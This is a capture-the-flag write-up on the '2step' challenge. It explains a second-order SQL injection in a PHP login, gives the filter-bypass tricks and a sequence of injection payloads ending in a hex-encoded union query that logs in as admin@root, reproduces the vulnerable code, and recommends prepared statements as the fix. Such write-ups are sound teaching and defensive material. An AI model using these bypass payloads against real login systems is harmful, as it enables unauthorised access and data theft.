2step
==============

Overview
--------
Again a server side rendered web application presented itself, just like in obxssession, but this time it only presented a login page and nothing else. If a user manages to log in with a correct email and password combination s/he would be presented with a welcome message and if that mail was `admin@root` the flag will be shown as well.

Vulnerability
-------------
During the login process this application executes two SQL queries where the first one is build by plain string concatenation and the second one is a prepared statement where the first parameter is set in the SQL string before the statement is prepared in order to set the second parameter. This first parameter is the mail column returned by the first query so one might think it is not possible to inject a malicious string since it comes from the database. But since the first query is only protected in an insecure way we can inject almost anything we want into the second one.

Exploitation
------------
To be honest with this one I was stepping in the dark for quiet a while. It didn't take me long to figure out how I can bypass the sanitiser but it took me what felt like ages to figure out what to do with this. My early discoveries where that the closing quote can be realised like that `\'`, white space can be replaced with a comment `/**/` and the replaced words can be protected by placing a word of same language inside it, eg. `UNorION -> UNION`. Then I tried a bunch of random injections to see what I could do but none of them manipulated the mail column in the result. Only after stepping through the code in my mind in reverse starting from the point where the flag gets accessed I realised that with a clever unioned query I can write into the resulting row. The next obstacle was inserting an opening and closing quote in the middle of my payload, the technique from before didn't work because the `\\` in the middle of a query would cause a syntax error. It occurred to me that I might be able to replace the quote character with its ASCII value in hexadecimal but that was not enough so I encoded the whole string in its hex value which got me the flag.  

During the process I set up a local MySql database and modified the source code of the application a little to validate my trial, error and assumptions. The values of `$in_mail` within the top lines show a summary of my path to the flag.

    <?php
    # seems like ther are 204 users

    # $in_mail = "\'/**/OorR/**/1=1/**/LIorMIT/**/1#";
    # $in_mail = "\'/**/UNorION/**/SEorLECT/**/password/**/FRorOM/**/USorERS/**/WHorERE/**/id=1#";
    # $in_mail = "\'/**/UNorION/**/SEorLECT/**/passwoorrd,passwoorrd,passwoorrd/**/FRorOM/**/users/**/WHorERE/**/id=1#";
    # $in_mail = "\'/**/UNorION/**/SEorLECT/**/0,0,0#";
    $in_mail = "\'/**/UNorION/**/SEorLECT/**/0,0x27204f52206d61696c203d202761646d696e40726f6f74272327,0#";
    # ' OR mail = 'admin@root'#

    $in_password = "unguessable";

    function graceful_death($message) {
        echo $message."\n";
        exit(1);
    }

    function sanitize($str) {
        if(preg_match('/["\s;\-\|&\(\)]/i', $str) !== 0) {
            graceful_death("Malicious characters detected");
        }
            $out = preg_replace('/union|select|where|and|or|concat|from/i', '', $str);
        $out = preg_replace("/'/", "\\'", $out);
        return $out;
    }

    function sql_execute($conn, $sql) {
        try {
            $sth = $conn->query($sql);
        } catch(PDOException $e) {
            echo $e->getTraceAsString()."\n\n";
            graceful_death($e->getMessage());
        }
        $result = $sth->fetchAll();
        return $result;
    }

    try {
        $dbh = new PDO("mysql:host=".$argv[1].";dbname=".$argv[2],
                       $argv[3], $argv[4]);
        $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $dbh->setAttribute(PDO::ATTR_EMULATE_PREPARES, 0);
    } catch(PDOException $e) {
        echo "could not connect to database: " . $e->getMessage();
    }

    $mail = sanitize($in_mail);
    echo "\n".$mail."\n\n";

    $password = sanitize($in_password);
    $sql = "SELECT * FROM users WHERE mail = '$mail'";
    echo $sql."\n\n";

    $usrs = sql_execute($dbh, $sql);
    echo var_dump($usrs);

    if(count($usrs) < 1) {
        graceful_death("Mail not found");
    } elseif(count($usrs) > 1) {
        graceful_death("Multiple users returned");
    } else {
        $sql = "SELECT mail FROM users WHERE mail = '" . $usrs[0]['mail'] . "' AND password = :password";
        echo "\n".$sql."\n\n";
        $sth = $dbh->prepare($sql);
        if(!$sth) graceful_death("empty");
        $sth->bindValue(':password', $password);
        echo "\n".var_dump($sth)."\n\n";
        $result = $sth->execute();
        if(false === $result) graceful_death();
        $result = $sth->fetchAll();
        echo "\n".var_dump($result)."\n";
        if(count($result) === 1) {
            graceful_death("Logged in");
        } else {
            graceful_death("Wrong password");
        }
    }
    ?>

Solution
--------
Don't try to sanitize user input which forms part of a SQL query, it's next to impossible to catch all the forms of malicious input. Use prepared statement instead! ... and use them everywhere, not just where you expect user input.  
To be specific I would replace the following lines.
    
	- $usrs = sql_execute($dbh, "SELECT * FROM users WHERE mail = '$mail'");
    + $sth = $dbh->prepare("SELECT * FROM users WHERE mail = :mail");
    + $sth->bindValue(':mail', $mail);
    + $usrs = $sth->execute();
    + $usrs = $sth->fetchAll();


	- $sql = "SELECT mail FROM users WHERE mail = '" . $usrs[0]['mail'] . "' AND password = :password";
	+ $sql = "SELECT mail FROM users WHERE mail = :mail AND password = :password";

	+ $sth->bindValue(':mail', $usrs[0]['mail']);
